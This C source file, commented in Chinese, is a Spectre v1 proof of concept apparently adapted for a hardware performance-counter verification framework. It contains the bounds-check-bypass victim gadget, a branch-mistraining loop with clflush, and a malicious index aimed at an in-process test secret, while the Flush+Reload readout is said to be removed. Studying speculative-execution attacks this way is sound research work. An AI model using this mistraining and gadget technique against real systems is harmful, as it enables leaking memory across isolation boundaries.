/* ============================================================
 *  Spectre v1 PoC — 适配三阶段验证框架版本
 *
 *  改编自 Modified for Control Flow Purposes 版 Spectre PoC
 *  改造内容：
 *    [-] 删除 macOS 专有 kdebug_signpost() 调用
 *    [-] 删除 readMemoryByte() 内自实现的 Flush+Reload 探测
 *        （计时通道、CACHE_HIT_THRESHOLD、results[256] 评分）
 *        —— Stage3 由框架独立模块完成
 *    [~] secret 由多字节串 "Fingerprint 0x414141414"
 *        改为单字节 "Y"
 *    [~] array2 大小由 256*512 改为 256*PROBE_STRIDE_MAX
 *    [~] victim 内硬编码 stride=512 改为 volatile probe_stride
 *    [+] 添加框架 PMU 接口声明
 *    [+] spectre_function 加 noinline + STAGE1_BEGIN/END
 *        + NOP_REGION_BEGIN/END + snap_before/after
 *    [+] 抽离 mistrain+trigger 为独立函数
 *    [+] 实现 vf_run_attack_once / vf_get_probe_addr_for_secret
 *        / vf_prepare_probe_region
 *    [+] main 内输出 Stage1 BR_MISP 增量并调用 UOPS 打印
 * ============================================================ */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

#ifdef _MSC_VER
  #include <intrin.h>      /* for clflush */
  #pragma optimize("gt",on)
#else
  #include <x86intrin.h>   /* for clflush */
#endif

/* ============================================================
 *  框架必需：瞬态区标记 + 探针步长
 * ============================================================ */
#define NOP_REGION_BEGIN  asm volatile("# NOP_REGION_BEGIN");
#define NOP_REGION_END    asm volatile("# NOP_REGION_END");

volatile size_t probe_stride = 512;

/********************************************************************
 * Victim code (保留原始数据布局)
 ********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {
    1,
    2,
    3,
    4,
    5,
    6,
    7,
    8,
    9,
    10,
    11,
    12,
    13,
    14,
    15,
    16
};
uint8_t unused2[64];
uint8_t array2[256 * 512];

/* 单字节 secret —— 字符串字面量形式 */
char *secret = "Y";

uint8_t temp = 0; /* Used so compiler won't optimize out victim_function() */

/********************************************************************
 * 框架 PMU 接口声明（实现由框架链接器提供）
 ********************************************************************/
extern int      pmu_stage1_get_count(void);
extern uint64_t pmu_stage1_get_delta(int i);
extern int      pmu_stage2_get_count(void);
extern uint64_t pmu_stage2_get_delta(int i);

extern void     pmu_uops_snap_before(void);
extern void     pmu_uops_snap_after(void);
extern void     pmu_uops_print_results(void);
extern int      pmu_uops_get_count(void);
extern int32_t  pmu_uops_get_transient(int i);

/********************************************************************
 * Victim Function (Gadget) —— 框架 PMU 插桩位置
 *
 *  插桩布局：
 *    snap_before  →  STAGE1_BEGIN  →  分支判断
 *                                   →  NOP_REGION_BEGIN
 *                                   →  瞬态访问
 *                                   →  NOP_REGION_END
 *                                   →  STAGE1_END  →  snap_after
 ********************************************************************/
__attribute__((noinline))
void spectre_function(size_t x) {

    pmu_uops_snap_before();

    asm volatile(".globl STAGE1_BEGIN\nSTAGE1_BEGIN:");
    if (x < array1_size) {
        NOP_REGION_BEGIN
        temp &= array2[array1[x] * 512];
        NOP_REGION_END
    }
    asm volatile(".globl STAGE1_END\nSTAGE1_END:");

    pmu_uops_snap_after();
}

/********************************************************************
 * Mistrain + Trigger
 *
 *  从原 readMemoryByte() 的内层循环抽离，保留原始位运算逻辑：
 *    - 30 次循环
 *    - clflush(array1_size) 延长瞬态窗口
 *    - 位运算无分支地选择 x = training_x 或 malicious_x
 ********************************************************************/
__attribute__((noinline))
void stage1_mistrain_trigger(size_t malicious_x) {
    int j;
    size_t training_x, x;

    /* training_x 选择保留原始策略：基于运行轮次取模 */
    training_x = (size_t)(0) % array1_size;

    for (j = 29; j >= 0; j--) {
        _mm_clflush(&array1_size);
        for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */

        /* Bit twiddling: x = training_x if j%6!=0, else malicious_x */
        x = ((j % 6) - 1) & ~0xFFFF;            /* j%6==0 → 0xFFFF0000 else 0 */
        x = (x | (x >> 16));                    /* j%6==0 → 0xFFFFFFFF else 0 */
        x = training_x ^ (x & (malicious_x ^ training_x));

        /* Call the victim! */
        spectre_function(x);
    }
}

/********************************************************************
 * 框架 API
 ********************************************************************/

/* [API-1] 给定 secret 字节值，返回 array2 中对应的探测地址 */
volatile uint8_t *vf_get_probe_addr_for_secret(uint8_t s) {
    return &array2[(size_t)s * probe_stride];
}

/* [API-2] 预填 candidate_count 个探针缓存行（避免 COW 零页） */
void vf_prepare_probe_region(int candidate_count) {
    if (candidate_count <= 0 || candidate_count > 256) {
        candidate_count = 256;
    }
    for (int i = 0; i < candidate_count; i++) {
        volatile uint8_t *p = vf_get_probe_addr_for_secret((uint8_t)i);
        *p = 1;
    }
}

/* [API-3] 执行一次完整攻击：mistrain + trigger */
void vf_run_attack_once(void) {
    size_t malicious_x = (size_t)(secret - (char *)array1);
    stage1_mistrain_trigger(malicious_x);
}

/********************************************************************
 * main —— 独立运行入口（框架插桩时可被替换）
 ********************************************************************/
#ifndef STAGE2_TEST_MAIN
int main(int argc, const char **argv) {
    size_t malicious_x = (size_t)(secret - (char *)array1);
    int i;

    /* 初始化 array2，写脏避免 copy-on-write 零页 */
    for (i = 0; i < (int)sizeof(array2); i++) {
        array2[i] = 1;
    }

    /* 可选命令行参数（保留原 PoC 调用形式） */
    if (argc == 3) {
        sscanf(argv[1], "%p", (void **)(&malicious_x));
        malicious_x -= (size_t)array1;
    }

    /* 执行 Stage1 + Stage2 测量 */
    stage1_mistrain_trigger(malicious_x);

    /* 输出 Stage1 BR_MISP 增量（供框架 Stage1 评分解析） */
    {
        int n = pmu_stage1_get_count();
        for (i = 0; i < n; i++) {
            printf("STAGE1_DELTA_BR_MISP_COND[%d]=%llu\n",
                   i,
                   (unsigned long long)pmu_stage1_get_delta(i));
        }
    }

    /* 输出 Stage2 UOPS 测量结果（供框架 Stage2 评分解析） */
    pmu_uops_print_results();

    return 0;
}
#endif